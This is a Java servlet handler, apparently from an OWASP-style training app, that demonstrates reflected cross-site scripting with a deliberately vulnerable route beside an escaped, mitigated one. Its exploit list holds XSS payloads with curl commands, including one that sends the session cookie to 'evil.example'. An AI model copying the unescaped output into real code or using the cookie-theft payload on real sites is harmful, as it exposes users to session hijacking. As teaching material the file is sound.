package com.owasp.demo.controller;

import com.owasp.demo.util.Messages;
import com.owasp.demo.view.TemplateEngine;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.IOException;

public class XssHandler implements IRouteHandler {

    @Override
    public void handle(HttpServletRequest req, HttpServletResponse res) throws IOException {
        String path = req.getPathInfo();

        if ("POST".equals(req.getMethod()) && "/xss/vulnerable".equals(path)) {
            handleVulnerable(req, res);
        } else if ("POST".equals(req.getMethod()) && "/xss/mitigated".equals(path)) {
            handleMitigated(req, res);
        } else {
            renderPage(res, null, null, null, null);
        }
    }

    private void handleVulnerable(HttpServletRequest req, HttpServletResponse res) throws IOException {
        String input = req.getParameter("comment");
        renderPage(res, input, input, null, null);
    }

    private void handleMitigated(HttpServletRequest req, HttpServletResponse res) throws IOException {
        String input = req.getParameter("comment2");
        renderPage(res, null, null, input, TemplateEngine.escape(input));
    }

    private void renderPage(HttpServletResponse res,
                            String vulnInput, String vulnOutput,
                            String safeInput, String safeOutput) throws IOException {
        String info = TemplateEngine.infoBox(
            Messages.get("xss.info.explanation"),
            Messages.get("xss.info.mitigation")
        );

        String xssPayload = "<script>alert('XSS')</script>";

        String vulnForm = """
            <form method="POST" action="/xss/vulnerable" class="space-y-3">
              <label class="block text-sm font-medium text-gray-700">Post a comment</label>
              <input type="text" name="comment"
                placeholder='Try: %s'
                value="%s"
                class="w-full border border-gray-300 rounded px-3 py-2 text-sm"/>
              <button class="bg-red-600 text-white px-4 py-2 rounded text-sm hover:bg-red-700">Submit (Vulnerable)</button>
            </form>
            %s
            """.formatted(
                TemplateEngine.escape(xssPayload),
                TemplateEngine.escape(vulnInput != null ? vulnInput : ""),
                vulnOutput != null
                    ? "<div class='mt-3 p-3 bg-red-50 border border-red-200 rounded text-sm'><strong>Rendered output:</strong><br/>" + vulnOutput + "</div>"
                    : ""
            );

        String safeForm = """
            <form method="POST" action="/xss/mitigated" class="space-y-3">
              <label class="block text-sm font-medium text-gray-700">Post a comment</label>
              <input type="text" name="comment2"
                placeholder='Try: %s'
                value="%s"
                class="w-full border border-gray-300 rounded px-3 py-2 text-sm"/>
              <button class="bg-green-600 text-white px-4 py-2 rounded text-sm hover:bg-green-700">Submit (Safe)</button>
            </form>
            %s
            """.formatted(
                TemplateEngine.escape(xssPayload),
                TemplateEngine.escape(safeInput != null ? safeInput : ""),
                safeOutput != null
                    ? "<div class='mt-3 p-3 bg-green-50 border border-green-200 rounded text-sm'><strong>Rendered output (escaped):</strong><br/>" + safeOutput + "</div>"
                    : ""
            );

        String panels = """
            <div class="grid md:grid-cols-2 gap-6">
              %s
              %s
            </div>
            """.formatted(
                TemplateEngine.demoPanel(Messages.get("xss.panel.vulnerable"), "red", vulnForm, ""),
                TemplateEngine.demoPanel(Messages.get("xss.panel.mitigated"), "green", safeForm, "")
            );

        String exploits = TemplateEngine.exploitBox(new String[][]{
            {"Basic alert", "<script>alert('XSS')</script>",
             "Classic proof-of-concept — pops an alert box in the victim's browser.", "comment",
             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"comment=<script>alert('XSS')</script>\""},
            {"Cookie theft", "<script>document.location='http://evil.example/steal?c='+document.cookie</script>",
             "Exfiltrates the session cookie to an attacker-controlled server.", "comment",
             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"comment=<script>document.location='http://evil.example/steal?c='+document.cookie</script>\""},
            {"DOM manipulation", "<img src=x onerror=\"document.body.style.background='red'\">",
             "Uses an invalid src to trigger onerror, then alters the page DOM.", "comment",
             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'comment=<img src=x onerror=alert(1)>'"},
            {"Stored payload", "<script>document.title='Hacked by XSS'</script>",
             "Runs as the victim and changes the tab title. A stored script can do anything the user can do. The session stays alive.", "comment",
             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"comment=<script>document.title='Hacked by XSS'</script>\""},
        });

        String content = TemplateEngine.vulnerabilityBadge(Messages.get("xss.badge.id"), Messages.get("xss.badge.name"), Messages.get("xss.badge.tag")) + info + exploits + panels;
        res.getWriter().write(TemplateEngine.page(Messages.get("xss.title"), content, true));
    }
}
